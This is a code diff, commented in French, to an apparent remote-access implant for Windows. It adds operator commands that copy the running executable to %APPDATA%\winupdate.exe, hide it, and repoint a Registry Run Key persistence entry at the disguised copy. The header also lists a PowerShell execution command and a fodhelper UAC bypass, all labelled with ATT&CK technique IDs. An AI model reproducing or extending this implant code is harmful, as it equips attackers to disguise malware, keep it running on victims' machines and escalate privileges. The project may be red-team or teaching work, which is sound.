@@ -24,6 +24,9 @@
  *   ps <commande>        — exécution via PowerShell (T1059.001)
  *   elevate              — UAC bypass fodhelper auto (T1548.002)
  *   privesc <exe_path>   — UAC bypass fodhelper manuel (T1548.002)
+ *   masquerade_install   — copie vers %APPDATA%\winupdate.exe, cache (T1036.003)
+ *   masquerade_remove    — supprime la copie masquee
+ *   masquerade_status    — etat de la copie masquee
  *   persist_install      — installe la persistance Registry Run Key (T1547.001)
  *   persist_remove       — supprime la persistance
  *   persist_status       — vérifie si la persistance est active
@@ -48,6 +51,8 @@
  *   T1071.001 — Application Layer Protocol (HTTPS/TLS)
  *   T1573.001 — Encrypted Channel (mTLS)
  *   T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys
+ *   T1036.003 — Masquerading:
+ * Rename System Utilities (winupdate.exe)
  */
 
 #ifdef _WIN32
@@ -56,6 +61,7 @@
 #include <unistd.h> /* sleep (pour tests sur Linux) */
 #endif
 
+#include "../payloads/masquerade.h"
 #include "../payloads/shell.h"
 #include "privesc.h"
 #include "tls.h"
@@ -303,18 +309,93 @@ int main(void) {
                 continue;
             }
 
+            /* masquerade_install — copie l'exe vers %APPDATA%\winupdate.exe (T1036.003)
+             * Copie le binaire courant sous un nom systeme puis le masque.
+             * Idempotent : une copie precedente est ecrasee. */
+            if (strcmp(cmd, "masquerade_install") == 0) {
+#ifdef _WIN32
+                const char *msg =
+                    (masquerade_install() == 0)
+                        ? "[masquerade] installed — %APPDATA%\\winupdate.exe (hidden)\r\n"
+                        : "[masquerade] error — copy failed\r\n";
+#else
+                const char *msg = "[masquerade] not supported on this platform\r\n";
+#endif
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+                buf[out_len] = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* masquerade_remove — supprime la copie masquee (T1036.003) */
+            if (strcmp(cmd, "masquerade_remove") == 0) {
+#ifdef _WIN32
+                const char *msg = (masquerade_remove() == 0)
+                                      ? "[masquerade] removed\r\n"
+                                      : "[masquerade] error — delete failed\r\n";
+#else
+                const char *msg = "[masquerade] not supported on this platform\r\n";
+#endif
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+                buf[out_len] = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* masquerade_status — etat de la copie masquee (T1036.003) */
+            if (strcmp(cmd, "masquerade_status") == 0) {
+#ifdef _WIN32
+                const char *msg = masquerade_is_installed() ? "[masquerade] active\r\n"
+                                                            : "[masquerade] not installed\r\n";
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+                buf[out_len] = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+#else
+                const char *msg = "[masquerade] not supported on this platform\r\n";
+                int out_len = (int)strlen(msg);
+                memcpy(buf, msg, out_len);
+                buf[out_len] = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+#endif
+                continue;
+            }
+
             /* persist_install — installe la persistance Registry Run Key (T1547.001) */
             if (strcmp(cmd, "persist_install") == 0) {
 #ifdef _WIN32
-                const char *msg = (persist_install() == 0)
-                    ? "[persist] installed — HKCU\\...\\Run\r\n"
-                    : "[persist] error — registry write failed\r\n";
+                /* Si la copie masquee existe (#30, T1036.003), la Run Key
+                 * pointe dessus : au demarrage, c'est l'exe camoufle de
+                 * %APPDATA% qui est relance, pas l'original du dossier
+                 * de depot. Sinon, on pointe sur l'exe courant. */
+                char pdest[MAX_PATH];
+                int prc;
+                if (masquerade_dest_path(pdest, sizeof(pdest)) == 0 && masquerade_is_installed())
+                    prc = persist_install_path(pdest);
+                else
+                    prc = persist_install();
+                const char *msg = (prc == 0) ? "[persist] installed — HKCU\\...\\Run\r\n"
+                                             : "[persist] error — registry write failed\r\n";
 #else
                 const char *msg = "[persist] not supported on this platform\r\n";
 #endif
                 int out_len = (int)strlen(msg);
                 memcpy(buf, msg, out_len);
-                buf[out_len]     = '\x00';
+                buf[out_len] = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
                 buf[out_len + 3] = 'D';
@@ -326,14 +407,14 @@ int main(void) {
             if (strcmp(cmd, "persist_remove") == 0) {
 #ifdef _WIN32
                 const char *msg = (persist_remove() == 0)
-                    ? "[persist] removed\r\n"
-                    : "[persist] error — registry delete failed\r\n";
+                                      ? "[persist] removed\r\n"
+                                      : "[persist] error — registry delete failed\r\n";
 #else
                 const char *msg = "[persist] not supported on this platform\r\n";
 #endif
                 int out_len = (int)strlen(msg);
                 memcpy(buf, msg, out_len);
-                buf[out_len]     = '\x00';
+                buf[out_len] = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
                 buf[out_len + 3] = 'D';
@@ -345,14 +426,14 @@ int main(void) {
             if (strcmp(cmd, "persist_status") == 0) {
 #ifdef _WIN32
                 const char *msg = persist_is_installed()
-                    ? "[persist] active — WinUpdate in HKCU\\...\\Run\r\n"
-                    : "[persist] not installed\r\n";
+                                      ? "[persist] active — WinUpdate in HKCU\\...\\Run\r\n"
+                                      : "[persist] not installed\r\n";
 #else
                 const char *msg = "[persist] not supported on this platform\r\n";
 #endif
                 int out_len = (int)strlen(msg);
                 memcpy(buf, msg, out_len);
-                buf[out_len]     = '\x00';
+                buf[out_len] = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
                 buf[out_len + 3] = 'D';
